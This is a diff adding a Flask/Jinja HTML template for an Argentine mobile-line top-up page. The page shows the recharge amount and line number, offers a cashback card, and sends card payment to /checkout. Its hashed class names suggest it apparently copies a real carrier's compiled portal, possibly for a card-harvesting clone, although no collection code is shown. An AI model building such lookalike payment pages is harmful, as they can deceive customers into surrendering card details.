@@ -1,0 +1,58 @@
+{% extends "base.html" %}
+
+{% block content %}
+<body>
+<div billnumber="2284693038" thirdpartyrechargeenabled="true" id="root">
+	<div class="page-recharge-body">
+		<div class="page-recharge-tarjeta">
+			<div class="row">
+				<header class="header">
+					 
+					<p class="header__title">Ingresar nueva tarjeta</p>
+					
+				</header>
+				<div class="page-recharge-tarjeta">
+					<div class="row">
+						<header class="header">
+							 <a href="" ><img src="{{ url_for('static', filename='/img/icono-home-256.png') }}" style="width: 40px; height:40px;" alt=""></a>
+							 
+							<p class="header__title">Recarga con tarjeta</p>
+							
+						</header>
+						<div class="PortalBody_container__24WaL">
+   <h2 class="PageDetails_container__3kr5q">Tu recarga de <strong style="font-weight: 500;">{{ count }}</strong> a la línea <strong data-testid="line__number" style="font-weight: 500;">{{ number }}</strong> está casi lista.</h2>
+   <div class="HorizontalLine_divider__3CP4s"></div>
+   <div data-testid="cashback-card" class="Card-module_card__zeE7r" style="box-shadow: none; height: 100%;">
+      <div class="PaymentPackCard_header--cashback_pack__2YxbV" style="background-image: url('{{ url_for('static', filename='img/cashback-card-header-background.cbdd1773.png') }}');"><img src="{{ url_for('static', filename='img/cashback-card-header-text.f4ecdc77.png') }}" alt="Cashback" style="height: 23px;"></div>
+      <div class="PaymentPackCard_content__3gaCA" style="white-space: normal;">
+         <strong style="font-weight: 500;">¿Cómo funciona?</strong>
+         <p>Pagá con Tarjeta y acreditamos el <img src="{{ url_for('static', filename='img/cashback-light-black.94d13e40.svg') }}" alt="Logo Cashback"> como dinero disponible. </p>
+      </div>
+   </div>
+   <h1 class="PortalSectionTitle_container__2wiPQ">¿Cómo querés pagar?</h1>
+   <div class="Card-module_card__zeE7r">
+      <a href="/checkout">
+      <li class="PaymentMethods_list-item__19aHa PaymentMethods_clickable__2c_fU" data-teid="pay-with-card">
+         <img class="PaymentMethodIcons_card__35Iyl" src="{{ url_for('static', filename='img/metodo_tarjeta.svg') }}" alt="Icono tarjeta">
+         <div class="Box-module_box__hVN0g Box-module_box--align-start__flbgA Box-module_box--direction-column__jeQIq Box-module_box--justify-left__237PB PaymentMethods_texts__BUTlR">
+            <div class="PaymentMethods_title__3SpQM">Con tarjeta</div>
+            <div data-testid="subtitle" class="PaymentMethods_subtitle__2VL2l">Crédito o débito</div>
+         </div>
+         <div>
+            <svg class="Icon-module_icon__45JG8" height="31" width="31" viewBox="0 0 41 41">
+               <path d="M16.5,10L14,12.5l8,8l-8,8l2.5,2.5L27,20.5L16.5,10z"></path>
+            </svg>
+         </div>
+      </li>
+      </a>
+   </div>
+</div>
+                    </div></a>
+
+                         
+						</ol>
+					</div>
+				</div>
+</body>
+
+{% endblock %}
